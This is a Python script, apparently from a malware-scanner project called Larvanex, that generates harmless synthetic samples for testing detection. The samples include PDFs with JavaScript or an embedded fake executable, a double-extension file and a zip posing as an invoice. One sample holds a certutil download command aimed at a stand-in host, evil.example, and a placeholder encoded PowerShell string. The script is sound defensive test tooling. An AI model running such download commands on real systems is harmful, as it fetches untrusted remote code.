"""Generate safe, synthetic sample files so you can try Larvanex without
downloading real (dangerous) malware. Run: python samples/generate_samples.py

Everything created here is harmless test data: the "malicious" files only
contain trigger *markers* (magic bytes, keywords), never working code."""

from __future__ import annotations

import os
import zlib
import zipfile

BASE = os.path.dirname(os.path.abspath(__file__))
BENIGN = os.path.join(BASE, "benign")
SUSPICIOUS = os.path.join(BASE, "suspicious")

MINIMAL_PDF = b"""%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >> endobj
%%EOF
"""

FAKE_PE = b"MZ" + b"\x00" * 58 + b"PE\x00\x00" + b"\x90" * 200


def _write(folder: str, name: str, data: bytes) -> str:
    os.makedirs(folder, exist_ok=True)
    path = os.path.join(folder, name)
    with open(path, "wb") as handle:
        handle.write(data)
    return path


def _pdf_with_javascript() -> bytes:
    return b"""%PDF-1.4
1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert('pwned')) >> >> endobj
%%EOF
"""


def _pdf_with_embedded_pe() -> bytes:
    compressed = zlib.compress(FAKE_PE)
    return (
        b"%PDF-1.4\n"
        b"4 0 obj << /Length " + str(len(compressed)).encode() + b" /Filter /FlateDecode >>\n"
        b"stream\n" + compressed + b"\nendstream\nendobj\n%%EOF\n"
    )


def _zip_with_executable() -> bytes:
    import io

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("invoice.txt", "Please see attached.")
        archive.writestr("invoice.exe", b"MZ" + b"\x00" * 100)
    return buffer.getvalue()


def main() -> None:
    made = [
        _write(BENIGN, "hello.txt", b"Just a normal text file.\n" * 20),
        _write(BENIGN, "report.pdf", MINIMAL_PDF),
        _write(BENIGN, "notes.zip", _make_benign_zip()),
        _write(SUSPICIOUS, "invoice.pdf.exe", FAKE_PE),
        _write(SUSPICIOUS, "malicious.pdf", _pdf_with_javascript()),
        _write(SUSPICIOUS, "hidden_payload.pdf", _pdf_with_embedded_pe()),
        _write(SUSPICIOUS, "dropper.zip", _zip_with_executable()),
        _write(SUSPICIOUS, "obfuscated.txt", b"powershell -enc " + b"A" * 80 + b"\ncmd.exe /c certutil -urlcache http://evil.example/x"),
    ]
    print("Generated sample files:")
    for path in made:
        print(f"  {os.path.relpath(path, BASE)}")


def _make_benign_zip() -> bytes:
    import io

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("todo.txt", "buy milk\nwalk dog\n")
        archive.writestr("data.csv", "a,b,c\n1,2,3\n")
    return buffer.getvalue()


if __name__ == "__main__":
    main()
